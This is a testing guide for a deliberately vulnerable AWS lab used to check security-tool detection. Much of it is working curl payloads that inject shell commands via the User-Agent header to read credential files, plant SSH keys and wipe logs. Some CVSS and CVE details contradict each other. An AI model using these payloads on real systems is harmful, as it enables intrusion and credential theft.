# CSPM Testing Guide for CNAPPuccino

> **Key RCE Vector:** All exploitation in this lab uses a **Shellshock-like command injection** vulnerability—direct User-Agent header injection in the CGI handler, mimicking classic Shellshock attack chains but not relying on Bash function-import (which is patched/disabled here).

This guide provides comprehensive testing scenarios to validate your Cloud Security Posture Management (CSPM) tool's detection capabilities using the CNAPPuccino vulnerable environment.

> **LOTL Approach:** CNAPPuccino strictly follows Living-Off-The-Land principles—everything is created, tested, and exploited using only built-in or cloud-native tools (Bash, Terraform, AWS CLI) for maximal realism and minimal "lab bloat".

## Two-Stage Testing Methodology

CNAPPuccino implements a realistic enterprise security testing workflow that mirrors real-world attack timelines:

### **Stage 1: Posture Assessment & Baseline (0-24 hours)**
- **Purpose**: Static vulnerability detection and behavioral baseline establishment
- **Duration**: 24 hours minimum (recommended enterprise timeline)
- **Activities**: CSPM scanning, EDR/XDR agent installation, compliance assessment
- **No active exploitation** - purely assessment and baseline establishment

### **Stage 2: Runtime Exploitation (24+ hours)**  
- **Purpose**: Behavioral detection and incident response validation
- **Prerequisites**: Stage 1 baseline establishment complete
- **Activities**: Active exploitation, lateral movement simulation, attack chain execution
- **Tests real-time detection** and response capabilities

## Pre-Testing Setup

### 1. (MANDATORY) Configure Lab Before Deploying
```bash
./start.sh
# Select option 1: ⚙️ Lab Configuration
# Set AWS Profile, Region, Owner, Purpose, Instance Type, Allowed CIDR as desired
```

### 2. Deploy CNAPPuccino Environment
```bash
./start.sh
# Select option 2: 🚀 Deploy Lab (Stage 1)
# Choose "y" when prompted to monitor bootstrap progress
```

### 3. Stage 1: Establish Security Baseline
```bash
# SSH into instance and install your EDR/XDR agent
ssh ubuntu@<instance-ip>
# Install your preferred EDR/XDR agent

# Configure your CSPM tools to scan the instance
# Let tools establish 24-hour baseline of normal behavior
```

### 3. Stage 2: Begin Active Testing (After 24h)
```bash
./start.sh
# Select option 5: ⚡ Multi-Stage Runtime Exploits (Stage 2)
```

## Quick RCE Test (Immediate Validation)

### Purpose
Validate deployment success and basic RCE capability immediately after deployment, without waiting for the 24-hour soak period.

### Execution
```bash
./start.sh
# Select option 3: 🧪 Quick RCE Test
```

### What This Tests
- **Shellshock-like command injection via CGI eval(User-Agent header)** (_direct shell injection, NOT classic function-import Shellshock_)
- **Remote command execution** from external terminal to vulnerable VM
- **Basic connectivity** and service functionality
- **Framework mapping** demonstration (CVE, MITRE ATT&CK, OWASP)

### Expected Output
```
Testing against: http://54.123.45.67/cgi-bin/exec.cgi

Executing direct command injection with framework indicators...

RCE_INDICATOR
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux cnappuccino 3.13.0-170-generic #220-Ubuntu SMP Thu May 9 12:40:49 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux

✅ Quick RCE test complete!

What this demonstrated:
• Remote Code Execution via eval(User-Agent) - direct command injection
• Remote Command Execution - External attacker gaining shell access
• MITRE ATT&CK - T1059.004 (Unix Shell), T1190 (Exploit Public-Facing App)
• OWASP Top 10 - A06:2021 (Vulnerable and Outdated Components)
• _Note: Not exploitable via Shellshock function import (patched Bash), but is still directly vulnerable to arbitrary command injection via User-Agent._
```

### Detection Expectations
Even this quick test should trigger alerts in properly configured security tools:
- **HTTP traffic** with suspicious User-Agent headers
- **CGI script execution** outside normal patterns
- **Command execution** from web services
- **Shellshock exploitation signatures**

### Use Cases
- **Deployment validation** - Confirm environment is working before soak period
- **Demo purposes** - Quick demonstration of vulnerability without full staging
- **Troubleshooting** - Verify basic connectivity and RCE functionality
- **Training** - Show immediate exploitation vs. behavioral detection differences

**Note:** This is independent of the staged testing workflow and can be run at any time after deployment.

### Alternate Payloads
- Classic Shellshock function-import is patched; use direct header injection instead:
  - `curl -s -H "User-Agent: () { :; }; whoami" http://$TARGET_IP/cgi-bin/exec.cgi`
  - `curl -s -H "User-Agent: id; hostname; uname -a" http://$TARGET_IP/cgi-bin/exec.cgi`

## Bootstrap Diagnostics

CNAPPuccino now includes comprehensive bootstrap diagnostics to help troubleshoot deployment issues:

### **Bootstrap Diagnostics Tool**
```bash
./start.sh
# Select option 9: 🔍 Bootstrap Diagnostics
```

**Features:**
- **SSH Connectivity Checks**: Verifies instance is reachable before diagnostics
- **Bootstrap Status**: Shows current phase and completion status
- **Service Health**: Checks Apache, Nginx, SSH service status
- **Port Validation**: Confirms required ports are listening
- **Recent Logs**: Displays last 5 bootstrap log entries
- **Failure Diagnostics**: Root cause analysis for failed deployments

### **When to Use Diagnostics**
- **Stuck Deployments**: When "User Data Running" appears to be stuck
- **Service Failures**: When basic services aren't starting
- **Connectivity Issues**: When you can't SSH into the instance
- **Post-Deployment Validation**: To verify everything is working correctly

### **Diagnostic Output Example**
```
🔍 Bootstrap Diagnostics for 54.157.240.129

✅ SSH connection successful

📊 Bootstrap Status: completed
✅ Completed Phases: init, packages, assets, apache, nginx, services, validation
⏳ Current Phase: N/A (completed)

🔧 Service Status:
apache2 active
nginx   active
ssh     active

🌐 Listening Ports:
80 (apache2) listening
8080 (nginx) listening
8443 (nginx-ssl) listening
22 (ssh) listening

📋 Recent Bootstrap Logs:
[2025-01-28 06:10:32] [INFO] [validation] All validation checks passed
[2025-01-28 06:10:30] [INFO] [services] Service startup completed
[2025-01-28 06:10:25] [INFO] [nginx] Nginx configuration completed
```

### **Common Diagnostic Findings**
- **SSH Failed**: Instance may still be booting (normal in first 2-3 minutes)
- **Bootstrap Status "failed"**: Check failed phase and error logs
- **Service Not Running**: Check service logs and configuration
- **Port Not Listening**: Service configuration or startup failure

For detailed troubleshooting guidance, see the Troubleshooting section in the main README.md.

## Vulnerability Testing Matrix

| Vulnerability                  | CVE            | OWASP Top 10 | MITRE ATT&CK         | Severity         | Test Endpoint                         | Exploitation Method                  | Testing Stage   |
|------------------------------- |----------------|--------------|----------------------|------------------|---------------------------------------|--------------------------------------|-----------------|
| **Shellshock-like CGI Command Injection** | CVE-2014-6271\* | A06:2021     | T1059.004, T1190     | Critical (9.8)   | `http://$TARGET_IP/cgi-bin/exec.cgi`  | Arbitrary shell command in User-Agent header (Shellshock-style) | Stage 1 & 2     |
| **Heartbleed** | CVE-2014-0160 | A06:2021 | T1005, T1040 | Critical (7.5) | `https://$TARGET_IP:8443` | SSL heartbeat manipulation | Stage 1 & 2 |
| **File Upload** | - | A03:2021, A04:2021 | T1105, T1059.004 | High | `http://$TARGET_IP/upload.php` | PHP web shell upload | Stage 2 |
| **Local File Inclusion** | - | A03:2021 | T1005, T1083 | High | `http://$TARGET_IP/view.php` | Path traversal parameter | Stage 2 |
| **Directory Listing** | - | A01:2021, A05:2021 | T1083, T1552.001 | Medium | `http://$TARGET_IP:8080/secret/` | Direct URL access | Stage 1 |
| **Weak SSH** | - | A07:2021 | T1110.001, T1078.003 | High | `ssh://$TARGET_IP:22` | Credential brute force | Stage 1 & 2 |
| **Hardcoded Secrets** | - | A07:2021, A09:2021 | T1552.001, T1078 | High | Multiple locations | File system enumeration | Stage 1 |
| **Disabled Firewall** | - | A05:2021 | T1562.004 | Medium | System-wide | Service configuration check | Stage 1 |
| **Weak SSL/TLS** | - | A02:2021, A05:2021 | T1040, T1557 | Medium | `https://$TARGET_IP:8443` | Protocol/cipher enumeration | Stage 1 |
| **IMDSv1 Enabled** | - | A05:2021 | T1552.006 | Medium | EC2 Metadata Service | Unauthenticated metadata access | Stage 1 |
| **EOL Operating System** | Multiple | A06:2021 | T1082 | High | System-wide | Version fingerprinting | Stage 1 |

## Stage 1: Posture Assessment Testing (0-24 hours)

### Objective
Test static vulnerability detection and security posture assessment capabilities without active exploitation.

### Activities During Stage 1
- Deploy CNAPPuccino environment
- Install EDR/XDR agent manually  
- Configure CSPM tools to scan the instance
- Allow security tools to establish behavioral baseline
- Run compliance scans and configuration assessments

### Stage 1 Testing Checklist

#### **Operating System & Infrastructure**
• End-of-life Ubuntu 14.04 LTS detection
• Missing security patches identification
• Vulnerable package version discovery
• Disabled firewall detection
• Insecure service configurations

#### **Credential & Secrets Management**  
• Hardcoded AWS credentials in `/etc/profile`
• API keys in `/opt/cnappuccino/secret/` files
• Database credentials in web application configs
• SSH weak password policies
• Default/empty password accounts

#### **Network & SSL/TLS Security**
• Weak SSL/TLS protocols (SSLv3, TLS 1.0/1.1) 
• Insecure cipher suites detection
• Self-signed certificate identification
• Missing security headers

#### **Cloud Infrastructure Security**
• IMDSv1 enabled (unauthenticated metadata service access)
• Insecure EC2 metadata configuration
• Missing IMDSv2 enforcement

#### **Web Application Security (Static)**
• Directory listing enabled detection
• Unrestricted file upload endpoint discovery
• Local file inclusion vulnerability identification
• Insecure PHP configuration

### Expected Stage 1 Findings
Your CSPM tool should identify **at minimum**:

**Critical Findings:**
- CVE-2014-6271 (Shellshock-like, header injection) - CVSS 10.0
- CVE-2014-0160 (Heartbleed) - CVSS 7.5  
- End-of-life operating system
- Hardcoded AWS credentials

**High Findings:**
- Disabled system firewall
- Weak SSH configuration  
- Unrestricted file upload capability
- Local file inclusion vulnerability

**Medium/Low Findings:**
- Weak SSL/TLS configuration
- Information disclosure via directory listing
- Missing security headers
- Default service configurations

## Stage 2: Runtime Exploitation Testing (24+ hours)

### Objective
Test behavioral detection and incident response capabilities through active exploitation and attack simulation.

### Prerequisites
- Stage 1 baseline establishment complete (24+ hours)
- EDR/XDR agent installed and reporting
- CSPM tools have established normal behavior patterns

### Stage 2 Testing Execution

#### **Automated Exploitation Suite**
```bash
./start.sh
# Select option 5: ⚡ Multi-Stage Runtime Exploits (Stage 2)
```

This executes a 5-stage attack simulation:
1. **System Reconnaissance** (T1083 - File and Directory Discovery)
2. **Credential Harvesting** (T1552.001 - Credentials In Files)  
3. **File System Enumeration** (T1083 - File and Directory Discovery)
4. **Process Enumeration** (T1057 - Process Discovery)
5. **CIEM Privilege Escalation** (Simulated EC2 Instance Role → Lambda Admin Role takeover with optional REAL execution — Cloud IAM/Lambda attack chain)
   - **If run in execute mode**: Will attempt actual AWS `sts:AssumeRole` into a Lambda administration role and create a live Lambda function (then delete if undo selected)
   - **MITRE ATT&CK Mapping**: T1552.006 *(Cloud Instance Metadata API)*, T1078 *(Valid Accounts)*, T1059.004 *(Unix Shell)*, T1190 *(Exploit Public-Facing Application)*
   - **OWASP Top 10 Mapping**: A05:2021 *(Security Misconfiguration)*, A07:2021 *(Identification and Authentication Failures)*
   - Demonstrates **Cloud Infrastructure Entitlement Management (CIEM)** risks: privilege escalation via misconfigured trust relationships and over-permissive roles

#### **Individual Exploit Testing**
```bash
# Quick RCE validation
./start.sh
# Select option 3: 🧪 Quick RCE Test

# Manual exploitation examples
export TARGET_IP=$(cd terraform && terraform output -raw public_ip)

# Shellshock-like RCE (direct header command injection)
curl -H "User-Agent: id; whoami; uname -a" http://$TARGET_IP/cgi-bin/exec.cgi

# Credential harvesting
curl -H "User-Agent: cat /opt/cnappuccino/secret/aws_creds.txt" http://$TARGET_IP/cgi-bin/exec.cgi

# File enumeration
curl -H "User-Agent: ls -la /opt/cnappuccino/secret/" http://$TARGET_IP/cgi-bin/exec.cgi
```

### Expected Stage 2 Detection

Your EDR/XDR and behavioral monitoring should detect:

#### **Network Anomalies**
- Suspicious HTTP User-Agent headers containing shell code
- Unusual CGI script execution patterns
- Command injection signatures in HTTP traffic
- Outbound connections from web services

#### **Process Anomalies**
- Shell execution from web server processes (apache2, www-data)
- Unusual process chains (apache → bash → system commands)
- File access patterns outside normal web service behavior
- Privilege enumeration activities

#### **File System Anomalies**
- Access to sensitive system files (/etc/passwd, /etc/shadow)
- Reading credential files outside normal application flow
- Directory enumeration in sensitive locations
- Temporary file creation in unusual locations

#### **Behavioral Patterns**
- Command execution sequence indicating reconnaissance
- Credential harvesting followed by privilege escalation attempts
- Lateral movement simulation (CIEM testing)
- Persistence establishment attempts

## Advanced Attack Chain Testing

### Test 1: Complete Attack Simulation
**Objective**: Test CSPM's ability to detect and correlate a full attack chain

**Attack Scenario**:
```bash
# Phase 1: Initial Compromise (T1190 - Exploit Public-Facing Application)
curl -H "User-Agent: echo 'INITIAL_COMPROMISE_$(date)' > /tmp/.attack_marker" \
     http://$TARGET_IP/cgi-bin/exec.cgi

# Phase 2: Discovery (T1083 - File and Directory Discovery)
curl -H "User-Agent: /bin/cat /etc/passwd && /bin/ps aux && /bin/netstat -tlpn" \
     http://$TARGET_IP/cgi-bin/exec.cgi

# Phase 3: Credential Access (T1552.001 - Credentials In Files)
curl -H "User-Agent: /bin/cat /opt/cnappuccino/secret/aws_creds.txt" \
     http://$TARGET_IP/cgi-bin/exec.cgi

# Phase 4: Persistence (T1098 - Account Manipulation)
curl -H "User-Agent: /bin/echo 'attacker_key' >> /home/admin/.ssh/authorized_keys" \
     http://$TARGET_IP/cgi-bin/exec.cgi

# Phase 5: Defense Evasion (T1070 - Indicator Removal on Host)
curl -H "User-Agent: /bin/rm -f /var/log/apache2/access.log.1 && echo > /var/log/auth.log" \
     http://$TARGET_IP/cgi-bin/exec.cgi
```

**CSPM Should Detect & Correlate**:
• Initial exploitation (Shellshock-like CGI RCE)
• Post-exploitation reconnaissance
• Credential theft
• Persistence mechanisms
• Log tampering attempts
• Timeline correlation of events
• Attack pattern recognition

## Compliance Framework Testing

### PCI DSS Validation
**Test**: Credit card data security requirements
```bash
# Check for unencrypted storage
curl -H "User-Agent: /bin/find / -name '*.txt' -exec grep -l '4[0-9]\{15\}' {} \;" \
     http://$TARGET_IP/cgi-bin/exec.cgi

# Verify encryption in transit
curl -k https://$TARGET_IP:8443 2>&1 | grep -E "cipher|protocol"
```

### SOX Compliance
**Test**: Financial data controls
```bash
# Check access controls
curl -H "User-Agent: /bin/ls -la /opt/cnappuccino/secret/" \
     http://$TARGET_IP/cgi-bin/exec.cgi

# Verify audit logging
curl -H "User-Agent: /bin/ls -la /var/log/" \
     http://$TARGET_IP/cgi-bin/exec.cgi
```

### HIPAA Assessment
**Test**: Healthcare data protection
```bash
# Check for PHI exposure
curl http://$TARGET_IP:8080/secret/ | grep -E "patient|medical|health"

# Verify access controls
curl "http://$TARGET_IP/view.php?file=/etc/shadow"
```

## Real-Time Detection Testing

### Test: Live Monitoring Validation
**Objective**: Test CSPM real-time detection capabilities

**Continuous Monitoring Test**:
```bash
#!/bin/bash
# Run this script to generate continuous suspicious activity

for i in {1..10}; do
    echo "[+] Iteration $i: Generating suspicious activity"
    
    # Simulate data exfiltration
    curl -H "User-Agent: /bin/cat /etc/passwd | /bin/base64" \
         http://$TARGET_IP/cgi-bin/exec.cgi
    
    # Simulate persistence attempts
    curl -H "User-Agent: /bin/echo 'backdoor_$i' >> /tmp/.persistence" \
         http://$TARGET_IP/cgi-bin/exec.cgi
    
    sleep 60
done
```

**CSPM Should Detect**:
• Repeated exploitation attempts
• Data exfiltration patterns
• Persistence installation
• Anomalous behavior patterns

## Testing Methodology

### 1. Baseline Testing
Run initial CSPM scan without exploitation to establish baseline findings.

### 2. Static Vulnerability Testing
Test detection of vulnerabilities through configuration and version analysis.

### 3. Dynamic Exploitation Testing
Actively exploit vulnerabilities to test behavioral detection.

### 4. Post-Exploitation Testing
Test detection of post-compromise activities and lateral movement.

### 5. Compliance Testing
Validate against specific regulatory frameworks (PCI DSS, SOX, HIPAA).

### 6. Reporting Validation
Verify CSPM reports contain:
• Accurate vulnerability details
• CVSS scores and risk ratings
• Remediation recommendations
• Compliance mapping
• Attack vector analysis

## Expected CSPM Findings Summary

Your CSPM tool should identify **at minimum**:

### Critical Findings (CVSS 9.0-10.0)
• CVE-2014-6271 (Shellshock-like Command Injection) - CVSS 10.0
• CVE-2014-0160 (Heartbleed) - CVSS 7.5
• Remote code execution via multiple vectors
• Hardcoded AWS credentials

### High Findings (CVSS 7.0-8.9)
• End-of-life operating system
• Disabled firewall
• Weak SSH configuration
• Unrestricted file upload
• Local file inclusion

### Medium Findings (CVSS 4.0-6.9)
• Information disclosure via directory listing
• Weak SSL/TLS configuration
• Missing security headers
• Default/weak passwords

### Low Findings (CVSS 0.1-3.9)
• Software version disclosure
• Unnecessary services running
• Missing security updates

## Troubleshooting Testing Issues

### Common Problems

**CSPM not detecting vulnerabilities:**
- Verify network connectivity to target
- Check if CSPM has required AWS permissions
- Ensure proper target configuration in CSPM

**False negatives:**
- Update CSPM vulnerability database
- Verify scanning scope includes all ports
- Check if authenticated scanning is enabled

**False positives:**
- Validate findings manually using provided exploitation commands
- Cross-reference with CVE databases
- Check CSPM configuration for overly sensitive rules

### Validation Commands

```bash
# Verify target is reachable
ping $TARGET_IP

# Check open ports
nmap -p 22,80,8080,8443,3306 $TARGET_IP

# Verify vulnerabilities exist
curl -H "User-Agent: echo 'RCE_CONFIRMED'" http://$TARGET_IP/cgi-bin/exec.cgi
```

## Conclusion

This comprehensive testing guide validates your CSPM tool against:
- **10 OWASP Top 10 categories**
- **20+ MITRE ATT&CK techniques**
- **Multiple CVEs with active exploits**
- **Real-world attack scenarios**
- **Compliance framework requirements**

Use this guide to ensure your CSPM tool provides comprehensive coverage of cloud security posture management requirements and accurately detects the full spectrum of security issues in your environment.
